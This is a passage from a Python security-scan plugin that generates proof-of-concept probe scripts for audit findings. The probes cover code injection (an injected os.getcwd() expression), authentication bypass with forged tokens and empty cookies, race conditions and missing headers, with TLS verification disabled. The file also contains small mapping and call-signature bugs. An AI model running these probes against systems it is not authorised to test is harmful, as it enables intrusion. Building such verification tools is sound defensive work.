                    conclusion = "服务端拒绝了跨域无 token 请求"
                else:
                    verdict = "inconclusive"
                    conclusion = "无法自动判定（建议手动检查该端点是否执行状态变更操作）"
                return {{"findingId": "{findingId}", "riskType": "csrf", "verdict": verdict, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'hardcoded-secret': {
        'pocMethod': '静态检测：硬编码密钥/凭证位于源代码中，无需发送请求即可确认。建议人工验证密钥是否仍然有效',
        'requestType': '无（静态发现）',
        'template': dedent("""\
            def poc_hardcoded_secret():
                \"\"\"硬编码密钥/凭证 POC（静态发现，无需网络请求）
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                return {{
                    "findingId": "{findingId}",
                    "riskType": "hardcoded-secret",
                    "results": [{{
                        "test": "静态检测",
                        "file": "{filePath}",
                        "line": {lineNumber},
                        "suspicious": True,
                        "note": "硬编码密钥/凭证存在于源代码中，建议人工验证其是否仍然有效并轮换",
                    }}],
                }}
        """),
    },
    'code-execution': {
        'pocMethod': 'HTTP 请求代码执行探测：注入无害 Python 表达式（算术运算/字符串拼接），检测 eval/exec 是否执行了注入代码',
        'requestType': 'HTTP PUT + POST',
        'template': dedent("""\
            def poc_code_execution(base_url, path, param_name="python_code", method="PUT", headers=None, cookies=None):
                \"\"\"代码执行（eval/exec）POC 验证 — 无害化 payload
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                import hashlib
                # 无害化 payload：通过算术运算和字符串操作产生可预测的输出标记
                # 不执行任何系统命令、文件操作或网络请求
                marker = "POC_" + hashlib.md5(b"code_exec_test").hexdigest()[:8]
                payloads = [
                    (f"2**10", "算术运算（2的10次方=1024）"),
                    (f"'P'+'O'+'C'+'_'+'OK'", "字符串拼接验证"),
                    (f"str(len('security'))+'x'+str(7*7)", "复合表达式"),
                    (f"__import__('os').getcwd()", "获取当前工作目录（只读）"),
                ]
                results = []
                # 代码执行漏洞通常需要两步：先写入恶意代码，再触发执行
                # 步骤1：尝试写入无害代码到存储字段
                url_write = f"{{base_url}}{{path}}"
                for payload, desc in payloads:
                    try:
                        if method.upper() == "PUT":
                            write_resp = session.put(url_write, json={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        else:
                            write_resp = session.post(url_write, json={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        results.append({{
                            "step": "写入", "payload": payload, "type": desc,
                            "status_code": write_resp.status_code,
                            "response_length": len(write_resp.text),
                            "note": "写入步骤完成，需手动触发执行验证",
                        }})
                    except Exception as e:
                        results.append({{"step": "写入", "payload": payload, "type": desc, "error": str(e)}})
                    break  # 只尝试第一个无害 payload
                # 步骤2：检查 eval 端点是否可达
                # 尝试从 attackChain 或 pocConcept 推导触发端点
                results.append({{
                    "step": "说明",
                    "note": "代码执行漏洞需要先写入 payload 再触发执行。写入步骤已完成，"
                           "请根据 pocConcept 手动触发执行端点验证。"
                           "无害 payload: 2**10 → 若执行成功应返回 1024",
                }})
                return {{"findingId": "{findingId}", "riskType": "code-execution", "results": results}}
        """),
    },
    'access-control': {
        'pocMethod': '认证缺失验证：认证 vs 匿名响应对比 + 敏感数据检测 + 写操作测试',
        'requestType': 'HTTP GET/POST/PUT/DELETE',
        'template': dedent("""\
            def poc_access_control(base_url, path, param_name="input", method="GET", headers=None, cookies=None):
                \"\"\"认证缺失/访问控制 POC — 认证对比 + 敏感数据检测
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                import re, json as _json
                url = f"{{base_url}}{{path}}"
                evidence = []
                verdict = "inconclusive"
                # Step 1: 认证请求 baseline
                try:
                    auth_resp = session.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
                    evidence.append({{"step": "auth_baseline", "status": auth_resp.status_code, "length": len(auth_resp.text)}})
                except:
                    return {{"findingId": "{findingId}", "riskType": "access-control", "verdict": "error", "evidence": [], "conclusion": "无法连接目标端点"}}
                # Step 2: 匿名请求
                anon = requests.Session()
                try:
                    anon_resp = anon.get(url, timeout=10, verify=False)
                except:
                    anon_resp = None
                if anon_resp:
                    anon_blocked = anon_resp.status_code in (401, 403, 302)
                    auth_has_data = auth_resp.status_code == 200 and len(auth_resp.text) > 50
                    anon_has_data = anon_resp.status_code == 200 and len(anon_resp.text) > 50
                    # 检测匿名响应是否包含敏感数据特征（JSON 对象、用户信息字段）
                    sensitive_patterns = ["password", "secret", "token", "email", "phone", "address", "credit", "ssn"]
                    anon_body_lower = anon_resp.text.lower()
                    sensitive_in_anon = [p for p in sensitive_patterns if p in anon_body_lower]
                    # 关键对比：匿名响应是否和认证响应内容相似
                    same_content = anon_has_data and auth_has_data and abs(len(anon_resp.text) - len(auth_resp.text)) < max(50, len(auth_resp.text) * 0.1)
                    evidence.append({{"step": "anon_vs_auth",
                                     "anon_status": anon_resp.status_code, "anon_length": len(anon_resp.text),
                                     "auth_status": auth_resp.status_code, "auth_length": len(auth_resp.text),
                                     "anon_blocked": anon_blocked, "anon_has_data": anon_has_data,
                                     "sensitive_fields_in_anon": sensitive_in_anon, "same_content": same_content}})
                    if anon_has_data and same_content:
                        verdict = "confirmed"
                        conclusion = "认证缺失已确认: 匿名用户获取到与认证用户相同的数据" + (f"（含敏感字段: {{', '.join(sensitive_in_anon)}}）" if sensitive_in_anon else "")
                    elif anon_has_data and sensitive_in_anon:
                        verdict = "confirmed"
                        conclusion = f"认证缺失已确认: 匿名用户可访问包含敏感数据的端点（{{', '.join(sensitive_in_anon)}}）"
                    elif anon_blocked:
                        verdict = "not_vulnerable"
                        conclusion = f"端点正确拒绝匿名访问（返回 {{anon_resp.status_code}}）"
                    elif anon_has_data:
                        verdict = "likely"
                        conclusion = "匿名用户获取到数据（需人工确认该端点是否应要求认证）"
                    else:
                        verdict = "not_vulnerable"
                        conclusion = "匿名用户未获取到有效数据"
                else:
                    verdict = "inconclusive"
                    conclusion = "匿名请求失败，无法对比"
                return {{"findingId": "{findingId}", "riskType": "access-control", "verdict": verdict, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'auth-bypass': {
        'pocMethod': '认证绕过验证：无凭证 vs 伪造凭证 vs 合法凭证三方对比',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_auth_bypass(base_url, path, param_name="input", method="POST", headers=None, cookies=None):
                \"\"\"认证绕过 POC — 三方凭证对比验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                url = f"{{base_url}}{{path}}"
                evidence = []
                bypass_vectors = []
                def _req(s, extra_headers=None, extra_cookies=None):
                    h = dict(extra_headers or {{}})
                    c = dict(extra_cookies or {{}})
                    try:
                        if method.upper() == "GET":
                            return s.get(url, headers=h, cookies=c, timeout=10, verify=False)
                        return s.post(url, json={{param_name: "poc_test"}}, headers=h, cookies=c, timeout=10, verify=False)
                    except:
                        return None
                # Baseline: 合法认证请求
                auth_resp = _req(session, headers, cookies)
                if not auth_resp:
                    return {{"findingId": "{findingId}", "riskType": "auth-bypass", "verdict": "error", "evidence": [], "conclusion": "无法连接目标端点"}}
                auth_ok = auth_resp.status_code in (200, 201, 204)
                auth_data = len(auth_resp.text) > 20
                evidence.append({{"step": "auth_baseline", "status": auth_resp.status_code, "length": len(auth_resp.text), "has_data": auth_data}})
                if not auth_ok:
                    return {{"findingId": "{findingId}", "riskType": "auth-bypass", "verdict": "inconclusive", "evidence": evidence, "conclusion": "认证请求本身失败，无法测试绕过"}}
                # Test 1: 完全无凭证
                anon = requests.Session()
                anon_resp = _req(anon)
                if anon_resp:
                    anon_gets_data = anon_resp.status_code in (200, 201, 204) and len(anon_resp.text) > 20
                    evidence.append({{"step": "no_credentials", "status": anon_resp.status_code, "length": len(anon_resp.text), "gets_data": anon_gets_data}})
                    if anon_gets_data:
                        bypass_vectors.append("无凭证访问")
                # Test 2: 伪造 Bearer token
                fake_resp = _req(anon, extra_headers={{"Authorization": "Bearer INVALID_FAKE_TOKEN_12345"}})
                if fake_resp:
                    fake_ok = fake_resp.status_code in (200, 201, 204) and len(fake_resp.text) > 20
                    evidence.append({{"step": "fake_bearer", "status": fake_resp.status_code, "length": len(fake_resp.text), "gets_data": fake_ok}})
                    if fake_ok:
                        bypass_vectors.append("伪造Bearer token")
                # Test 3: 空 session cookie
                empty_resp = _req(anon, extra_cookies={{"sessionid": "", "session": ""}})
                if empty_resp:
                    empty_ok = empty_resp.status_code in (200, 201, 204) and len(empty_resp.text) > 20
                    evidence.append({{"step": "empty_cookie", "status": empty_resp.status_code, "length": len(empty_resp.text), "gets_data": empty_ok}})
                    if empty_ok:
                        bypass_vectors.append("空Cookie")
                # 判定
                if bypass_vectors:
                    verdict = "confirmed"
                    conclusion = f"认证绕过已确认: 使用 {{', '.join(bypass_vectors)}} 可获取与合法用户相同的数据"
                else:
                    verdict = "not_vulnerable"
                    conclusion = "所有伪造/空凭证请求均被正确拒绝"
                return {{"findingId": "{findingId}", "riskType": "auth-bypass", "verdict": verdict, "bypassVectors": bypass_vectors, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'race-condition': {
        'pocMethod': '并发请求竞态探测：同时发送多个相同请求，检查是否全部成功（应只有部分成功或互斥）',
        'requestType': 'HTTP POST（并发）',
        'template': dedent("""\
            def poc_race_condition(base_url, path, param_name="input", method="POST", headers=None, cookies=None):
                \"\"\"竞态条件 POC 验证 — 并发请求测试
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                import threading
                results = []
                url = f"{{base_url}}{{path}}"
                concurrency = 5
                responses = [None] * concurrency
                errors = [None] * concurrency
                def send_request(idx):
                    try:
                        if method.upper() == "POST":
                            r = session.post(url, json={{param_name: f"poc_race_{{idx}}"}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        elif method.upper() == "PUT":
                            r = session.put(url, json={{param_name: f"poc_race_{{idx}}"}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        else:
                            r = session.get(url, params={{param_name: f"poc_race_{{idx}}"}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        responses[idx] = r
                    except Exception as e:
                        errors[idx] = e
                # 并发发送请求
                threads = []
                for i in range(concurrency):
                    t = threading.Thread(target=send_request, args=(i,))
                    threads.append(t)
                for t in threads:
                    t.start()
                for t in threads:
                    t.join(timeout=15)
                # 分析结果
                success_count = 0
                for i, resp in enumerate(responses):
                    if resp is not None:
                        ok = resp.status_code in (200, 201, 204)
                        if ok:
                            success_count += 1
                        results.append({{
                            "request": i,
                            "status_code": resp.status_code,
                            "response_length": len(resp.text),
                            "success": ok,
                        }})
                    elif errors[i]:
                        results.append({{"request": i, "error": str(errors[i])}})
                    else:
                        results.append({{"request": i, "error": "超时"}})
                # 如果所有并发请求都成功，说明没有互斥/锁保护
                suspicious = success_count > 1
                results.append({{
                    "test": "竞态条件分析",
                    "concurrent_requests": concurrency,
                    "success_count": success_count,
                    "suspicious": suspicious,
                    "note": f"{{success_count}}/{{concurrency}} 并发请求成功，缺少互斥保护" if suspicious else "服务端可能存在互斥/锁保护",
                }})
                return {{"findingId": "{findingId}", "riskType": "race-condition", "results": results}}
        """),
    },
    'insecure-configuration': {
        'pocMethod': '配置检测：不安全的配置项存在于配置文件中。可通过 HTTP 请求验证配置是否生效',
        'requestType': 'HTTP GET（可选）',
        'template': dedent("""\
            def poc_insecure_configuration(base_url="/", headers=None, cookies=None):
                \"\"\"不安全配置 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                results = [{{
                    "test": "静态配置检测",
                    "file": "{filePath}",
                    "line": {lineNumber},
                    "suspicious": True,
                    "note": "不安全配置项存在于配置文件中",
                }}]
                # 可选：验证安全头是否缺失
                if base_url and base_url != "/":
                    try:
                        resp = session.get(base_url, headers=headers, cookies=cookies, timeout=10, verify=False)
                        security_headers = {{
                            "X-Content-Type-Options": resp.headers.get("X-Content-Type-Options"),
                            "X-Frame-Options": resp.headers.get("X-Frame-Options"),
                            "Strict-Transport-Security": resp.headers.get("Strict-Transport-Security"),
                            "Content-Security-Policy": resp.headers.get("Content-Security-Policy"),
                        }}
                        missing = [k for k, v in security_headers.items() if not v]
                        results.append({{
                            "test": "安全响应头检测",
                            "missing_headers": missing,
                            "suspicious": len(missing) > 0,
                        }})
                    except Exception as e:
                        results.append({{"test": "安全响应头检测", "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "insecure-configuration", "results": results}}
        """),
    },
}

# 通用 fallback 模板（未匹配到特定类型时使用）
# 改进：不再仅做连通性测试，而是根据 HTTP 方法进行多角度验证
GENERIC_POC_TEMPLATE = {
    'pocMethod': '通用端点验证：认证对比 + 敏感数据检测 + 错误信息泄露 + HTTP 方法覆盖',
    'requestType': 'HTTP GET/POST/PUT/DELETE',
    'template': dedent("""\
        def poc_generic_{safe_id}(base_url, path="/", param_name="input", method="GET", headers=None, cookies=None):
            \"\"\"通用 POC 验证
            目标: {filePath}:{lineNumber}
            风险类型: {riskType}
            风险描述: {description}
            \"\"\"
            url = f"{{base_url}}{{path}}"
            evidence = []
            verdict = "inconclusive"
            findings = []
            # Test 1: 认证 vs 匿名对比
            anon = requests.Session()
            try:
                auth_resp = session.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
                anon_resp = anon.get(url, timeout=10, verify=False)
                anon_blocked = anon_resp.status_code in (401, 403)
                anon_gets_data = anon_resp.status_code == 200 and len(anon_resp.text) > 50
                auth_gets_data = auth_resp.status_code == 200 and len(auth_resp.text) > 50
                evidence.append({{"step": "auth_compare",
                                 "anon_status": anon_resp.status_code, "anon_length": len(anon_resp.text),
                                 "auth_status": auth_resp.status_code, "auth_length": len(auth_resp.text),
                                 "anon_blocked": anon_blocked}})
                if anon_gets_data and auth_gets_data:
                    findings.append("匿名用户可访问端点数据")
            except Exception as e:
                evidence.append({{"step": "auth_compare", "error": str(e)}})
            # Test 2: 错误输入 — 检测信息泄露
            try:
                err_resp = session.get(url, params={{param_name: "{{'\\"\\\\"}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                leak_keywords = ["traceback", "exception", "stack trace", "debug", "internal server error", "sqlstate"]
                body_lower = err_resp.text.lower()
                leaked = [kw for kw in leak_keywords if kw in body_lower]
                if leaked:
                    findings.append(f"错误响应泄露调试信息({{', '.join(leaked)}})")
                evidence.append({{"step": "error_leak", "status": err_resp.status_code, "leaked_keywords": leaked}})
            except:
                pass
            # Test 3: 安全头检测
            try:
                resp = session.get(f"{{base_url}}/", timeout=10, verify=False)
                missing = [h for h in ["X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security"]
                           if not resp.headers.get(h)]
                if missing:
                    findings.append(f"缺失安全头({{', '.join(missing)}})")
                evidence.append({{"step": "security_headers", "missing": missing}})
            except:
                pass
            # 判定
            if findings:
                verdict = "likely"
                conclusion = "发现潜在安全问题: " + "; ".join(findings)
            else:
                verdict = "not_vulnerable"
                conclusion = "未检测到明显安全问题"
            return {{"findingId": "{findingId}", "riskType": "{riskType}", "verdict": verdict, "findings": findings, "evidence": evidence, "conclusion": conclusion}}
    """),
}


# 风险类型 slug 归一化映射（支持常见变体）
_RISK_TYPE_TO_TEMPLATE_KEY = {
    # 注入类
    'sql-injection': 'sql-injection',
    'sql_injection': 'sql-injection',
    'c1.1': 'sql-injection',
    'xss': 'xss',
    'cross-site-scripting': 'xss',
    'command-injection': 'command-injection',
    'cmd-injection': 'command-injection',
    'c1.2': 'command-injection',
    'code-execution': 'code-execution',
    'code_execution': 'code-execution',
    'code-injection': 'code-execution',
    'code_injection': 'code-execution',
    'eval-injection': 'code-execution',
    'rce': 'code-execution',
    'expression-injection': 'code-execution',
    'ssti': 'code-execution',
    # SSRF / XXE
    'ssrf': 'ssrf',
    'server-side-request-forgery': 'ssrf',
    'c1.3': 'ssrf',
    'c6.1': 'ssrf',
    'xxe': 'xxe',
    'xml-external-entity': 'xxe',
    'c6.2': 'xxe',
    # 路径遍历
    'path-traversal': 'path-traversal',
    'directory-traversal': 'path-traversal',
    'c4.1': 'path-traversal',
    # 认证授权类
    'access-control': 'access-control',
    'missing-auth': 'access-control',
    'missing-authentication': 'access-control',
    'endpoint-exposure': 'access-control',
    'auth-bypass': 'auth-bypass',
    'authentication-bypass': 'auth-bypass',
    'idor': 'idor',
    'insecure-direct-object-reference': 'idor',
    'c7.3': 'idor',
    # CSRF
    'csrf': 'csrf',
    'cross-site-request-forgery': 'csrf',
    'csrf-disabled': 'csrf',
    # 重定向
    'open-redirect': 'open-redirect',
    # 硬编码凭证
    'hardcoded-secret': 'hardcoded-secret',
    'hardcoded-credential': 'hardcoded-secret',
    'c5.1': 'hardcoded-secret',
    # 弱加密 — 不适合 POC 动态验证，映射到 None 跳过 POC 生成
    'weak-cryptography': None,
    'weak-crypto': None,
    'insecure-random': None,
    'insecure-crypto': None,
    'weak-password-hash': None,
    'plaintext-password': None,
    # 硬编码凭证 — 不适合 POC 动态验证
    'hardcoded-secret': None,
    'hardcoded-credential': None,
    # 竞态条件
    'race-condition': 'race-condition',
    'toctou': 'race-condition',
    # 不安全配置
    'insecure-configuration': 'insecure-configuration',
    'missing-security-headers': 'insecure-configuration',
    'insecure-cookie': 'insecure-configuration',
    'insecure-config': 'insecure-configuration',
    'd2.4': 'insecure-configuration',
    # 业务逻辑类
    'business-logic': 'access-control',
}


def _normalize_risk_type_slug(risk_type, finding=None):
    """将 riskType 归一化为 POC 模板键。
    
    当 riskType 是高层分类码（如 C3、C7）时，利用 finding 的
    subcategory、title、pocConcept 等字段推断具体漏洞类型。
    """
    if not risk_type:
        return 'unknown'
    slug = risk_type.lower().strip().replace(' ', '-').replace('_', '-')
    
    # 高层分类码 C3/C7 不是具体漏洞类型，需要从 finding 上下文推断
    # C3 = 认证授权, C7 = 业务逻辑 — 可能对应多种具体漏洞
    if slug in ('c3', 'c7') and finding:
        return _infer_template_from_finding(finding)
    
    # 直接匹配
    mapped = _RISK_TYPE_TO_TEMPLATE_KEY.get(slug)
    if mapped is not None:
        return mapped
    # 显式映射为 None 表示不适合 POC
    if slug in _RISK_TYPE_TO_TEMPLATE_KEY and _RISK_TYPE_TO_TEMPLATE_KEY[slug] is None:
        return None
    
    return slug


def _infer_template_from_finding(finding):
    """从 finding 的 subcategory、title、pocConcept 推断具体漏洞模板。
    
    返回模板键或 None（如果该漏洞类型不适合 POC 动态验证）。
    """
    subcategory = (finding.get('subcategory', '') or '').lower()
    title = (finding.get('title', '') or '').lower()
    poc_concept = (finding.get('pocConcept', '') or '').lower()
    description = (finding.get('description', '') or '').lower()
    
    combined = f"{subcategory} {title} {poc_concept} {description}"
    
    # ── 不适合 POC 动态验证的类型 → 返回 None ──
    # 弱加密/弱随机数 — 代码层面问题，发 HTTP 请求验证不了
    if any(kw in combined for kw in ['sha-1', 'sha1', 'md5', 'weak-crypto', '弱密码',
                                      '弱加密', '弱随机', 'insecure-random', 'nonce',
                                      'hashlib', 'random.rand', 'getpass', '密码生成']):
        return None
    # 硬编码凭证 — 需要看源码
    if any(kw in combined for kw in ['hardcoded', '硬编码', 'api.key', 'secret_key']):
        return None
    # 信息泄露 — 代码审查问题
    if any(kw in combined for kw in ['information-leak', 'sensitive-data-logging', '信息泄露']):
        return None
    
    # ── 适合 POC 动态验证的类型 ──
    # 代码执行 / eval / RCE
    if any(kw in combined for kw in ['eval', 'rce', 'exec(', 'code-execution', '代码执行', '远程代码']):
        return 'code-execution'
    
    # 竞态条件 / TOCTOU
    if any(kw in combined for kw in ['race-condition', 'toctou', '竞态', 'check_lock', 'atomic']):
        return 'race-condition'
    
    # 认证绕过
    if any(kw in combined for kw in ['auth-bypass', '认证绕过', 'bypass']):
        return 'auth-bypass'
    
    # IDOR / 越权
    if any(kw in combined for kw in ['idor', '越权', 'owner', '水平越权', '垂直越权']):
        return 'idor'
    
    # 访问控制缺失（默认 fallback for C3）
    return 'access-control'


def _safe_func_id(finding_id):
    """将 findingId 转为安全的 Python 函数名后缀"""
    return re.sub(r'[^a-zA-Z0-9]', '_', finding_id or 'unknown')


def _extract_endpoint_info(finding):
    """从 finding 的 attackChain、pocConcept 或显式字段中提取端点信息（path、method、param）"""
    endpoint_info = {
        'path': '',
        'method': 'GET',
        'param': '',
    }
    
    # 优先使用显式字段
    if finding.get('EndpointPath'):
        endpoint_info['path'] = finding.get('EndpointPath', '')
    if finding.get('EndpointMethod'):
        endpoint_info['method'] = finding.get('EndpointMethod', 'GET').upper()
    if finding.get('EndpointParam'):
        endpoint_info['param'] = finding.get('EndpointParam', '')
    
    # 如果有显式字段，直接返回
    if endpoint_info['path']:
        return endpoint_info

    # 收集所有可提取端点信息的文本源
    text_sources = []

    # 源1: pocConcept 字段 — 通常包含完整的攻击步骤和 URL
    poc_concept = finding.get('pocConcept', '') or ''
    if poc_concept:
        text_sources.append(('pocConcept', poc_concept))

    # 源2: attackChain.source
    chain = finding.get('attackChain')
    if isinstance(chain, dict):
        source = chain.get('source', '')
        source_str = json.dumps(source, ensure_ascii=False) if isinstance(source, dict) else str(source)
        if source_str:
            text_sources.append(('attackChain.source', source_str))

    # 源3: description 字段
    desc = finding.get('description', '') or ''
    if desc:
        text_sources.append(('description', desc))

    # 源4: evidence 数组
    evidence = finding.get('evidence', [])
    if isinstance(evidence, list):
        for ev in evidence:
            ev_str = ev if isinstance(ev, str) else json.dumps(ev, ensure_ascii=False)
            if ev_str:
                text_sources.append(('evidence', ev_str))

    # 从文本源中按优先级提取端点信息
    for source_name, text in text_sources:
        if not text:
            continue

        # 提取 HTTP 路径 — 改进正则，排除源码路径（包含 .py:）
        # 匹配类似 /api/mq_install/ 或 /cmdb/projects/<pid>/ 的 URL 路径
        path_patterns = [
            r'(?:GET|POST|PUT|PATCH|DELETE)\s+((?:/[\w\-./]+/?)+)',  # "GET /api/mq_install/"
            r'["\']((?:/api/|/cmdb/|/img/|/auth/|/admin/|/user/|/v\d/)[\w\-./]*)["\']',  # 带引号的 API 路径
            r'["\']((?:/[\w\-]+/[\w\-]+/?)?)["\']',  # 通用两段路径
        ]
        if not endpoint_info['path']:
            for pat in path_patterns:
                path_match = re.search(pat, text, re.IGNORECASE)
                if path_match:
                    candidate = path_match.group(1)
                    # 排除源码文件路径（如 /cmdb/views.py:262）
                    if '.py:' not in candidate and not candidate.endswith('.py'):
                        endpoint_info['path'] = candidate
                        break

        # 提取 HTTP 方法
        if not endpoint_info['method'] or endpoint_info['method'] == 'GET':
            method_match = re.search(r'\b(GET|POST|PUT|DELETE|PATCH)\b', text, re.IGNORECASE)
            if method_match:
                endpoint_info['method'] = method_match.group(1).upper()

        # 提取参数名
        if not endpoint_info['param']:
            param_patterns = [
                # Django/Python 风格
                r'request\.(GET|POST|body|data)\[?["\'](\w+)',
                r'(\w+)\s*=\s*(?:request|self|data)\.\w+\[?["\']?\w*["\']?\]?',
                r'data\[["\'](\w+)["\']\]',
                # Java 风格
                r'@RequestParam.*?["\'](\w+)',
                r'@PathVariable.*?["\'](\w+)',
                # 通用
                r'(?:参数|parameter|param|field)[:\s]*["\']?(\w+)',
            ]
            for pat in param_patterns:
                m = re.search(pat, text, re.IGNORECASE)
                if m:
                    endpoint_info['param'] = m.group(m.lastindex)
                    break

    # 最终清理：如果路径仍然是源码文件路径，清空
    if endpoint_info['path'] and ('.py:' in endpoint_info['path'] or endpoint_info['path'].endswith('.py')):
        endpoint_info['path'] = ''

    # Fallback: 从 pocConcept 提取 URL 路径（最可靠来源）
    if not endpoint_info['path'] and poc_concept:
        # 匹配 "PUT /cmdb/projects/1/" 或 "GET /api/mq_install/" 等格式
        url_match = re.search(r'(?:GET|POST|PUT|PATCH|DELETE)\s+((?:/[\w\-./]+/?)+)', poc_concept, re.IGNORECASE)
        if url_match:
            endpoint_info['path'] = url_match.group(1)

    # Fallback: 从 evidence 中提取 URL 路径
    if not endpoint_info['path'] and isinstance(evidence, list):
        for ev in evidence:
            ev_str = str(ev) if not isinstance(ev, str) else ev
            # 匹配 "sapps/bill/urls.py:6-8 — DefaultRouter 注册 mq_install"
            url_reg_match = re.search(r'path\s*\(\s*["\']([\w\-/]+)["\']', ev_str)
            if url_reg_match:
                endpoint_info['path'] = '/' + url_reg_match.group(1)
                break

    return endpoint_info


# ---------------------------------------------------------------------------
# POC 清单（manifest）生成
# ---------------------------------------------------------------------------

def build_poc_manifest(findings):
    """为每个 finding 生成 POC 验证清单条目。

    去重策略：同一 findingId 只生成一条 POC（取描述最完整的那条）。

    Returns:
        list of poc_entry dicts，每项包含：
        - findingId, filePath, lineNumber, riskType, severity
        - pocMethod: 验证方式描述
        - pocRequestType: 请求类型
        - pocFunctionName: 生成的 Python 函数名
        - endpointInfo: 提取的端点信息
        - templateKey: 使用的模板键
    """
    # 去重：同一 findingId 只保留描述最完整的条目
    seen_ids = {}
    deduped = []
    for f in findings:
        f = normalize_finding(f)
        fid = f.get('findingId', '')
        desc_len = len(f.get('description', '') or '')
        if fid in seen_ids:
            # 保留描述更长的那个
            if desc_len > seen_ids[fid]['desc_len']:
                deduped[seen_ids[fid]['index']] = f
                seen_ids[fid]['desc_len'] = desc_len
        else:
            seen_ids[fid] = {'index': len(deduped), 'desc_len': desc_len}
            deduped.append(f)

    manifest = []
    func_counter = {}

    for f in deduped:
        risk_type = f.get('riskType', '')
        template_key = _normalize_risk_type_slug(risk_type, finding=f)

        # 跳过不适合 POC 动态验证的漏洞类型（如弱加密、硬编码凭证等）
        # template_key 为 None 表示该漏洞仅需静态验证，不生成 POC
        if template_key is None:
            continue

        template_info = POC_TEMPLATES.get(template_key)

        if template_info:
            poc_method = template_info['pocMethod']
            request_type = template_info['requestType']
            func_base = f"poc_{template_key.replace('-', '_')}"
        else:
            poc_method = GENERIC_POC_TEMPLATE['pocMethod']
            request_type = GENERIC_POC_TEMPLATE['requestType']
            func_base = f"poc_generic_{_safe_func_id(f.get('findingId', ''))}"

        # 确保函数名唯一
        count = func_counter.get(func_base, 0)
        func_counter[func_base] = count + 1
        func_name = f"{func_base}_{count}" if count > 0 else func_base

        endpoint_info = _extract_endpoint_info(f)

        entry = {
            'findingId': f.get('findingId', ''),
            'filePath': f.get('filePath', ''),
            'lineNumber': f.get('lineNumber', 0),
            'riskType': risk_type,
            'severity': f.get('severity', 'medium'),
            'description': (f.get('description', '') or '')[:200],
            'pocMethod': poc_method,
            'pocRequestType': request_type,
            'pocFunctionName': func_name,
            'endpointInfo': endpoint_info,
            'templateKey': template_key if template_info else 'generic',
        }
        manifest.append(entry)

    return manifest


# ---------------------------------------------------------------------------
# POC 脚本文件生成
# ---------------------------------------------------------------------------

_SCRIPT_HEADER = dedent("""\
    #!/usr/bin/env python3
    \"\"\"
    POC 验证脚本 — 自动生成
    ============================================================
    本脚本由 security-scan 插件的 poc_generator.py 自动生成。
    每个函数对应一个发现的安全漏洞的验证逻辑。

    使用方法:
      1. 配置目标服务地址:
         python3 poc-scripts.py --base-url http://your-target:8080

      2. 配置认证凭据（如需要）:
         python3 poc-scripts.py --base-url http://your-target:8080 \\
           --cookie "session=abc123" \\
           --header "Authorization: Bearer <token>"

      3. 仅运行指定 finding 的 POC:
         python3 poc-scripts.py --base-url http://your-target:8080 --finding f-001

      4. 输出验证结果到 JSON 文件:
         python3 poc-scripts.py --base-url http://your-target:8080 --output poc-results.json

    注意事项:
      - 本脚本仅发送探测性请求，不执行破坏性操作
      - 请确保你有权对目标服务进行安全测试
      - 建议在测试环境而非生产环境中运行
      - 部分 POC 可能触发 WAF/IDS 告警

    生成时间: {generated_at}
    审计批次: {batch_id}
    漏洞总数: {total_findings}
    ============================================================
    \"\"\"
    import argparse
    import json
    import sys
    import time
    import urllib3

    # 禁用 SSL 警告（测试环境常见自签名证书）
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    try:
        import requests
    except ImportError:
        print("错误: 需要 requests 库。请运行: pip install requests", file=sys.stderr)
        sys.exit(1)

    # 全局会话
    session = requests.Session()


""")

_SCRIPT_RUNNER = dedent("""\

    # ===========================================================================
    # POC 运行器
    # ===========================================================================

    POC_REGISTRY = {poc_registry}


    def run_all_pocs(base_url, finding_filter=None, headers=None, cookies=None, callback_url=None):
        \"\"\"运行所有（或指定的）POC 验证函数\"\"\"
        results = []
        total = 0
        confirmed_count = 0
        likely_count = 0
        not_vulnerable_count = 0
        inconclusive_count = 0

        for entry in POC_REGISTRY:
            fid = entry["findingId"]
            if finding_filter and fid not in finding_filter:
                continue

            func_name = entry["funcName"]
            risk_type = entry["riskType"]
            template_key = entry["templateKey"]
            endpoint = entry.get("endpoint", {{}})

            func = globals().get(func_name)
            if not func:
                results.append({{"findingId": fid, "error": f"函数 {{func_name}} 未找到"}})
                continue

            total += 1
            path = endpoint.get("path", "/")
            param = endpoint.get("param", "input")
            method = endpoint.get("method", "GET")

            print(f"\\n[{{total}}] 验证 {{fid}} ({{risk_type}}): {{func_name}}", file=sys.stderr)
            try:
                # 根据模板类型调用不同参数签名
                if template_key in ("hardcoded-secret",):
                    result = func()
                elif template_key in ("xxe",):
                    result = func(base_url, path, headers=headers, cookies=cookies, callback_url=callback_url)
                elif template_key in ("csrf",):
                    result = func(base_url, path, headers=headers, cookies=cookies)
                elif template_key in ("insecure-configuration", "weak-cryptography"):
                    result = func(base_url, path, param, method, headers=headers, cookies=cookies)
                elif template_key in ("ssrf",):
                    result = func(base_url, path, param, method, headers=headers, cookies=cookies, callback_url=callback_url)
                else:
                    result = func(base_url, path, param, method, headers=headers, cookies=cookies)
            except Exception as e:
                result = {{"findingId": fid, "error": str(e)}}

            # 统计验证结论
            if isinstance(result, dict):
                v = result.get("verdict", "")
                conclusion = result.get("conclusion", "")
                if v == "confirmed":
                    confirmed_count += 1
                    print(f"  ✅ 已确认: {{conclusion}}", file=sys.stderr)
                elif v == "likely":
                    likely_count += 1
